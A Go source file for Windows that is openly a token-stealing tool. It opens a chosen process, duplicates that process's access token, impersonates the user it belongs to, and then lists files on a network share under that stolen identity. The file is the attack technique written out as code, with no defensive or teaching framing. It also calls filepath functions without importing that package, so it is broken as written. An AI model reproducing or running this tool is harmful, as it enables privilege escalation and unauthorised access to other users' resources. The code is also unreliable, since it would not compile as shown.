package main

import (
    "flag"
    "fmt"
    "os"
    "syscall"
    "unsafe"
)

var (
    processID  int
    targetPath string
)

const (
    ProcessQueryInformation = 0x0400
    ProcessDuplicateHandle  = 0x0200
    TokenDuplicate          = 0x0002
    TokenImpersonate        = 0x0004
    TokenAllAccess          = 0xF01FF
)

func init() {
    flag.IntVar(&processID, "processID", 0, "Process ID for token stealing")
    flag.StringVar(&targetPath, "targetPath", "", "Target path for network resource")
}

func openProcess(pid int) (syscall.Handle, error) {
    return syscall.OpenProcess(ProcessQueryInformation|ProcessDuplicateHandle, false, uint32(pid))
}

func openProcessToken(hProcess syscall.Handle) (syscall.Handle, error) {
    var hToken syscall.Handle
    err := syscall.OpenProcessToken(hProcess, TokenDuplicate|TokenImpersonate, &hToken)
    if err != nil {
        return 0, err
    }
    return hToken, nil
}

func duplicateToken(hToken syscall.Handle) (syscall.Handle, error) {
    var hTokenDup syscall.Handle
    ret, _, err := syscall.NewLazyDLL("advapi32.dll").NewProc("DuplicateTokenEx").Call(
        uintptr(hToken),
        uintptr(TokenAllAccess),
        0,
        uintptr(syscall.SecurityImpersonation),
        uintptr(syscall.TokenImpersonation),
        uintptr(unsafe.Pointer(&hTokenDup)),
    )
    if ret == 0 {
        return 0, err
    }
    return hTokenDup, nil
}

func impersonateLoggedOnUser(hToken syscall.Handle) error {
    ret, _, err := syscall.NewLazyDLL("advapi32.dll").NewProc("ImpersonateLoggedOnUser").Call(uintptr(hToken))
    if ret == 0 {
        return err
    }
    return nil
}

func main() {
    flag.Parse()

    if processID == 0 || targetPath == "" {
        fmt.Println("Both arguments are required: -processID and -targetPath")
        os.Exit(1)
    }

    fmt.Printf("Opening process with ID %d... ", processID)
    hProcess, err := openProcess(processID)
    if err != nil {
        fmt.Printf("Failed: %v\n", err)
        os.Exit(1)
    }
    defer syscall.CloseHandle(hProcess)
    fmt.Println("Success.")

    fmt.Print("Opening process token... ")
    hToken, err := openProcessToken(hProcess)
    if err != nil {
        fmt.Printf("Failed: %v\n", err)
        os.Exit(1)
    }
    defer syscall.CloseHandle(hToken)
    fmt.Println("Success.")

    fmt.Print("Duplicating token... ")
    hTokenDup, err := duplicateToken(hToken)
    if err != nil {
        fmt.Printf("Failed: %v\n", err)
        os.Exit(1)
    }
    defer syscall.CloseHandle(hTokenDup)
    fmt.Println("Success.")

    fmt.Print("Impersonating token... ")
    if err := impersonateLoggedOnUser(hTokenDup); err != nil {
        fmt.Printf("Failed: %v\n", err)
        os.Exit(1)
    }
    fmt.Println("Success.")

    fmt.Println("Accessing share:")
    files, err := filepath.Glob(filepath.Join(targetPath, "*"))
    if err != nil {
        fmt.Printf("Failed to access path: %v\n", err)
        os.Exit(1)
    }

    for _, file := range files {
        fmt.Println(file)
    }
}
